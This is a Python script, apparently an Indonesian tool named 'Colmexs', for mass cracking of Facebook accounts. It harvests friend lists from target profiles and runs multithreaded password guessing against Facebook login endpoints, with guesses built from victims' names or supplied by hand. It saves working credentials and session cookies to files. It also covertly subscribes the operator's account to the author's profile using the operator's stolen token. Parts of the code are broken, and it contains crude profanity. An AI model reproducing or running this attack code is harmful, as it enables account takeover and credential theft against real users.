# coding=utf-8

#     *file name: Colmexs
#     *copyright: (C) © 2023 ~ Jessica Putry
#     *contact me on whatsap: +6287799183568
#     *Group Facebok: RATU ERROR (owner)

#--- module in python
import os,sys,requests,re,bs4,datetime,json,time,random,platform
from time import sleep as jeda
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Romz_Xyz
from datetime import datetime
from random import randint

#module rich
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
# TANGGAL WAKTU
ct = datetime.now()
n = ct.month
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month 
uasm = []

waktu = ("{}-{}-{}").format(hari,bulan,tahun)
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

# WARNA
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
N = '\x1b[1;94m'
U = '\x1b[1;95m'
B = '\x1b[1;96m'
P = '\x1b[1;97m'
C = '\x1b[0m'    
pepek = ['100010061977994','maushamsingh088']

# HAPUS
def hapus():
        try:os.remove(".cokie.txt");os.remove(".token.txt")
        except:pass

# JALAN
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.005)

# LOGO
def logo():
	time.sleep (0.01)
	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟')
	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋')
	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋')
	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉')
	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀          \x1b[1;96mDiremas')
	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀   \x1b[1;96mdoong')
	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁   \x1b[1;96mbang')
	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶   \x1b[1;96mbiar')
	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟   \x1b[1;96mtambah ')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋    \x1b[1;96mnikmat.....KKKKK')
	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿')
	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃')
	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄')
	jalan ('\x1b[1;92mC  O  L  M  E  X  S')

def banner():                
	os.system('clear')
	print ('')
	print ('')
	print ('')
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print ('')
	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
	
# METHODE LOGIN
def login():
	try:
		ses = requests.Session()
		kukis = input(f'\n{P} Masukan cookie anda :{K} ')
		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
		open('data/token.txt','w').write(tokenB)
		open('data/cookie.txt','w').write(kukis)
		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
		print (f"\n{H} √ login berhasil");jeda(2)
		menu()
	except Exception as e:
		os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
		print(e)
		exit()
#  MENU
def menu():
#	try:
#		os.system("clear")
#		licensi = open(".licensi","r").read().strip()
#		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (licensi.strip(), platform.platform())).json()
#		if "error" in gets["status"]:
#			exit(" [×] message: "+gets["msg"]+"\n\n")
#		elif "berlaku" in gets["status"]:
#			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
#			os.system("clear")
#		elif "kadaluarsa" in gets["status"]:
#			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
#		else:
#			exit("[!] licensi tidak valid")
#	except FileNotFoundError:
#		activate_licensi()
	#folder()
	os.system("clear")
	try:
		token = open("data/token.txt","r").read()
		coki = {"cookie":open("data/cookie.txt","r").read()}
		try:
			nama=requests.get(f"https://mbasic.facebook.com/profile.php?v=info",cookies = coki).text 
		except:
			os.system('rm -rf data/cookie.txt && rm -rf data/token.txt')
			exit(f'{M} ! cookie invalid')
	except (FileNotFoundError,KeyError,IOError):
		print (f"{M} ! cookie invalid");jeda(2)
		login()
	except requests.exceptions.ConnectionError:
		exit(f"{M} ! tidak ada koneksi")
	banner()
	print('')
	print('')
	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
	print('')
	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
	if romz in ['']:
		print ("\n ! jangan kosong")
	elif romz in ['1']:
		publik(token,coki)
	elif romz in ['2']:
		massal(token,coki)
	elif romz in ['3']:
		massal(token,coki)
	elif romz in ['4']:
		massal(token,coki)
	elif romz in ['5']:
		massal(token,coki)
	elif romz in ['6']:
		hasil()
	elif romz in ['7']:
		UA()
		uas = open('ugent.txt','r').read()
		print (f"{P} ! User-Agent saat ini: {U}{uas}")
		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
		us = input (" ? User-Agent: ")
		if us in['no','No','NO']:
			exit()
		elif us in['']:
			uas = ("Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; ru) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.391 Mobile Safari/534.11+")
			open('ugent.txt','w').write(uas)
		else:
			open('ugent.txt','w').write(us)
	elif romz in ['0']:
		hapus()
		exit()
	else:
		print ("\n ! isi yg benar")

def activate_licensi():
	os.system("clear")
	logo()
	print("\x1b[1;97mKetik \x1b[1;92madmin\x1b[1;97m untuk mendapatkan lisensi script dari admin....terima kasih\n")
	key = input("\x1b[1;96m[\x1b[1;97m>\x1b[1;96m]\x1b[1;97m licensi: ").lower()
	if "gets" in key:
		os.system("xdg-open https://fbkey.ratuerror.com/register/")
		activate_licensi()
	elif "admin" in key:
		os.system("xdg-open https://wa.me/6287799183568?text=RATU%20COLMEXs....beli%20lisensi%20dooong")
		activate_licensi()
	else:
		gets = requests.get("https://fbkey.ratuerror.com/check.php?key=%s&dev=%s" % (key.strip(), platform.platform())).json()
		if "error" in gets["status"]:
			exit(" [×] message: "+gets["msg"]+"\n\n")
		elif "berlaku" in gets["status"]:
			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
			open(".licensi","w").write(key.strip())
			menu()
			os.system("clear")
		elif "kadaluarsa" in gets["status"]:
			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
		else:
			exit("[!] licensi tidak valid")

id =[]
# CRACK PUBLIK
def publik(token,cookie):
	try:
		user=input(f"\n{P} Masukan ID publik :\x1b[1;93m ")
		if user in pepek:
			exit("\n ! gk usah tolol")
		else:
			po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
			for i in po['friends']['data']:
				id.append(f"{i['id']}<=>{i['name']}")
			sys.stdout.write (f'\r {P}Jumlah ID :{H} {str(len(id))} '),
			sys.stdout.flush();jeda(0.0050)
	except KeyError:
		exit(f"{M} gagal mengambil ID")
	
	print('')
	return crack().__xnx__(id)
	
# CRACK UNLIMITED
def massal(token,cookie):
	try:
		print ('')
		jum = int(input(f"{P} Jumlah target : "))
		print ('')
	except:jum=1
	for t in range(jum):
		t +=1
		try:
			user=input(f"{P} Masukan ID publik {t}:\x1b[1;93m ")
			if user in pepek:
				exit("\n ! gk usah tolol")
			else:
				po = requests.get(f"https://graph.facebook.com/v13.0/{user}?fields=friends.limit(5000)&access_token={token}",cookies=cookie).json()
				for i in po['friends']['data']:
					id.append(f"{i['id']}<=>{i['name']}")
		except KeyError:
			exit(f"{M} gagal mengambil ID")
	print (f'\r {P}Jumlah ID{M} :{H} {len(id)} ')
	
	return crack().__xnx__(id)
	     
# CRACK PENCARIAN NAMA
# CRACK JUMLAH FOLLOWER
# CRACK ANGGOTA GROUP
	       
# LIHAT HASIL
oke,cepe=[],[]
def hasil():
	print(f"""
 1. Cek hasil akun {H}OK{P}
 2. Cek hasil akun {K}CP{P}
 0. Kembali
	""")
	rom = input(' ? Pilih: ')
	if rom in['']:
		exit("\n ! isi yg benar")
	elif rom in['1','01']: 
		try:
			dirs = os.listdir('OK')
			for file in dirs:
				oke.append(file)
		except:pass 
		if len(oke)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {H}OK{P} yg fersimpan di folder anda')
			nomor = 0
			for i in oke:
				fil = open(f"OK/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{H} {i} {P}-{H} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = oke[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalok = open(f"OK/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {H}{len(totalok)}")
			print(f"{P}#---")
			for ngontol in totalok:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;92m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['2','02']: 
		try:
			dirs = os.listdir('CP')
			for file in dirs:
				cepe.append(file)
		except:pass 
		if len(cepe)==0:
			exit("\n ! file tidak tersedia")
		else:
			print(f'\n + Hasil akun {K}CP{P} yg fersimpan di folder anda')
			nomor = 0
			for i in cepe:
				fil = open(f"CP/{i}").read().splitlines() 
				nomor+=1
				print(f"{P} {str(nomor)}.{K} {i} {P}-{K} {str(len(fil))} ")
			print(f"{P}\n + silahkan pilih nomor yg ingin di cek")
			file = input(f" ? nomor: ")
			try:
				hasil = cepe[int(file)-1]
			except (KeyError,IndexError,ValueError):
				exit ('\n ! isi yg benar')
			nm_file = hasil.replace("-", " ")
			file_nm = nm_file.replace('.txt', '')
			totalcp = open(f"CP/{hasil}", "r").read().splitlines()
			print(f"\n{P}#---")
			print (f"{P} Hasil tanggal: {file_nm} total: {K}{len(totalcp)}")
			print(f"{P}#---")
			for ngontol in totalcp:
				kontol = ngontol.replace("\n","")
				pukimek = kontol.replace(" *--> ","\x1b[1;97m└──\x1b[1;93m ")
				print('%s'%(pukimek));jeda(0.07)
			print ('')
			exit()
	elif rom in['0','00']:
		os.system("python simple.py")
	else:
		exit("\n ! isi yg benar")
	
# METHDOE CRACK
ok,cp,loop=[],[],0
class crack:
	
	def __init__(self):
		self.id =[]
	
	def __xnx__(self,id):
		self.id =id 
		cx=input(f" {P}Gunakan password manual {H}y{P}/{M}t {P}:\x1b[1;93m ")
		print ('')
		if cx in ('y'):
			self.manual()
		elif cx in ('t'):
			print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
			print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
			print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
			print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
			print ('')
			self.langsung()
		else:
			exit()
	
	def manual(self):
		print (f"\n{P} ! contoh: sayang,anjing,123456")
		pwek=input(" ? password: ")
		if pwek in(''):
			exit("\n ! jangan kosong")
		elif len(pwek)<=5:
			exit("\n ! password minimal 6 huruf")
		else:
			pass 
		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 \x1b[1;97makun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid = akun.split('<=>')[0]
				pwx = pwek.split(",")
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
		
	def langsung(self):
		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
		print (f"""
 {P}+ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
 + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
 + crack sedang berjalan... 
		""")
		with Romz_Xyz(max_workers=30) as titid:
			for akun in id:
				pwx = []
				uid,name = akun.split('<=>')[0],akun.split('<=>')[1].lower()
				na = name.split(' ')[0]
				if len(name)<6:
					if len(na)<3:
						pass 
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				else:
					if len(na)<3:
						pwx.append(name)
					else:
						pwx.append(name)
						pwx.append(na+'123')
						pwx.append(na+'12345')
						pwx.append(na+'1234')
				if men in['1']:
					titid.submit(self.__crack__, uid, pwx,  "free.facebook.com")
				elif men in['2']:
					titid.submit(self.__crack__, uid, pwx,  "mbasic.facebook.com")
				elif men in['3']:
					titid.submit(self.__crack1__, uid, pwx,  "m.facebook.com")
				elif men in['4']:
					titid.submit(self.__crack__, uid, pwx,  "graph.facebook.com")
				else:
					exit("\n ! isi yang benar")
					
		self.hasil(ok,cp)
	
	#--- methode
	def __crack__(self, user, peweh, url_log):
		global ok,cp,loop 
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ua = self.UA()
				ua2 = self.user_agentAPI()
				ses = requests.Session()
				headers1 = {
					"host":url_log,
					"connection": "keep-alive",
					"cache-control": "max-age=0",
					"upgrade-insecure-requests":"1",
					"user-agent":ua,
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"x-requested-with":"XMLHttpRequest",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"navigate",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"document",
					"referer":f"https://{url_log}/",
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
				}
				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',headers=headers1).text 
				times = int(datetime.now().timestamp())
				dataa ={
					'lsd':re.search('name="lsd" value="(.*?)"', str(ling)).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling)).group(1),
					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling)).group(1),
					'li': re.search('name="li" value="(.*?)"',str(ling)).group(1),
					'try_number': '0',
					'unrecognized_tries': '0',
					'email':user,
					'encpass': '#PWD_BROWSER:0:{}:{}'.format(times, pw),
					'prefill_contact_point':user,
					'prefill_source': 'browser_dropdown', 
					'prefill_type': 'password', 
					'first_prefill_source': 'browser_dropdown', 
					'first_prefill_type': 'contact_point', 
					'had_cp_prefilled':'true',
					'had_password_prefilled':'true',
					'is_smart_lock':'false',
					'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(ling)).group(1),
					'_fb_noscript': re.search('name="_fb_noscript" value="(.*?)"',str(ling)).group(1),
					'__dyn': '',
					'__csr': '',
					'__req': random.choice(['1','2','3','4','5']),
					'__a': re.search('"encrypted":"(.*?)"', str(ling)).group(1),
					'__user': '0'
					}
				headers2 ={ 
					'host': url_log,
					'content-length': f"{len(str(dataa))}",
					'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(ling)).group(1),
					'user-agent': ua2,
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*', 
					'origin': 'https://'+url_log,
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty', 
					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
					#'cookie': (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
					#}
				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=headers2, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict().keys():
					romz = ses.cookies.get_dict()
					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
					break
				elif 'checkpoint' in ses.cookies.get_dict().keys():
					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(3)
			
		loop+=1
	
	#--- methode
	def __crack1__(self, user, peweh, url_log):
		global loop,ok,cp
		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
		print(f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
		for pw in peweh:
			try: 
				ua = self.UA()
				ses = requests.Session()
				ling = ses.get(f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text 
				#times = int(datetime.now().timestamp())
				dataa ={
					'lsd':re.search('name="lsd" value="(.*?)"', str(ling.text)).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"', str(ling.text)).group(1),
					'm_ts': re.search('name="m_ts" value="(.*?)"',str(ling.text)).group(1),
					'li': re.search('name="li" value="(.*?)"',str(ling.text)).group(1),
					'email':user,
					'pass': pw,
					}
				headers2 ={ 
					'host': url_log,
					'content-length': '181',
					'user-agent': 'Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36',
					'content-type': 'application/x-www-form-urlencoded',
					'accept': '*/*', 
					'origin': 'https://'+url_log,
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty', 
					'referer': f'https://{url_log}/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
					}
				po = ses.post(f'https://{url_log}/login/device-based/login/async/?refsrc=deprecated&lwv=100', data=dataa, headers=headers2, allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict().keys():
					romz = ses.cookies.get_dict()
					kukis = ";".join(x["name"]+"="+x["value"] for x in send.json()["session_cookies"])
					#print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
					tree = Tree("",guide_style="b green")
					tree.add(f"[b green]{user}[/] ◊ [b green]{pw}[/]")
					tree.add(f"[b green]{kukis}[/]")
					tree.add(f"[b green]{ua}[/]")
					prints(tree)
					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
					break
				elif 'checkpoint' in ses.cookies.get_dict().keys():
					#print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
					tree = Tree("",guide_style="b yellow")
					tree.add(f"[b yellow]{user}[/] ◊ [b yellow]{pw}[/]")
					tree.add(f"[b green]{ua}[/]")
					prints(tree)
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			except requests.exceptions.ConnectionError:
				time.sleep(3)
		loop+=1


	# FINISH
	def hasil(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			print (f"\n\n{H} √ {P}crack selesai....")
			print (f"{H} + OK: {len(ok)} ")
			print (f"{K} + CP: {len(cp)}{P}");exit()
		else:
			exit(f"\n {M}× ops tidak mendapatkan hasil")
	
	#--- USER AGENT
	def UA(self):
		try:
			uas = open('ugent.txt','r').read()
		except (FileNotFoundError,IOError):
			uas = ("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.253.400 QQBrowser/12.6.5678.400")
			open('ugent.txt','w').write(uas)
		
		return uas 
			
	def user_agentAPI(self):
		ugent =[
			"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 11; RMX3501 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 12; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/390.0.0.27.105;]",
			"Mozilla/5.0 (Linux; Android 12; RMX2111 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]",
			"Mozilla/5.0 (Linux; Android 12; AC2003 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/397.0.0.23.404;]",
			"Mozilla/5.0 (Linux; Android 5.0.1; GT-I9500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 7.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"
			"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]",
			"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
			"Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
			"Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
			"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba",
